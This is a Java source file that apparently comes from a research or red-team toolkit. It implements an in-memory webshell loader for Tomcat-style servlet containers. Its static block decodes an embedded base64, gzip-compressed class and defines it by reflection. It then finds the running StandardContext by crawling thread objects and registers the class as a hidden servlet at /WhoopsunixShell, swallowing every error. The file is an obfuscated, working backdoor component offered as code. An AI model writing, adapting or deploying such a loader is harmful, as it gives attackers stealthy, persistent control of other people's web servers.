package com.demo.memshell.loader;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * 5-10 全版本
 */
public class ServletThreadLoader {
    private static String gzipObject = "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";
    private static Object object = null;
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";

    public ServletThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!isInject(standardContext)) {
                inject(standardContext);
            }

        } catch (Throwable e) {

        }
    }

    public static boolean isInject(Object standardContext) {
        try{
            Object container = invokeMethod(standardContext, "findChild", new Class[]{String.class}, new Object[]{NAME});
            if (container!= null) {
                return true;
            }

        }catch (Exception e){

        }
        return false;
    }

    public static void inject(Object standardContext) {
        try {
            if (object == null)
                return;
            // wrapper 封装
            Object wrapper = invokeMethod(standardContext, "createWrapper", new Class[]{}, new Object[]{});
            invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{NAME});
            invokeMethod(wrapper, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
            invokeMethod(wrapper, "setServlet", new Class[]{Class.forName("javax.servlet.Servlet")}, new Object[]{object});

            // 添加到 standardContext
            invokeMethod(standardContext, "addChild", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{wrapper});

            try {
                // M1 Servlet映射到URL模式
                invokeMethod(standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATTERN, NAME});
            } catch (NoSuchMethodException e) {
                // M2 Servlet3 新特性 Dynamic
                getConstructorObject("org.apache.catalina.core.ApplicationServletRegistration", new Class[]{Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")}, new Object[]{wrapper, standardContext});
                invokeMethod(Class.forName("javax.servlet.ServletRegistration$Dynamic"), "addMapping", new Class[]{String[].class}, new Object[]{new String[]{PATTERN}});
            }
        } catch (Exception e) {

        }
    }

    public static void getObject() throws Exception {
        // 动态代理兼容 javax jakarta
        Class servletClass = null;
        try {
            servletClass = Class.forName("jakarta.servlet.Servlet");
        } catch (Exception e) {
            try {
                servletClass = Class.forName("javax.servlet.Servlet");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        Object javaObject = clazz.newInstance();

        object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new ServletThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }


    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    public static Object getConstructorObject(String className, Class[] cls, Object[] object) {
        try {
            Constructor constructor = Class.forName(className).getDeclaredConstructor(cls);
            constructor.setAccessible(true);
            Object obj = constructor.newInstance(object);
            return obj;
        } catch (Exception e) {

        }
        return null;
    }

}
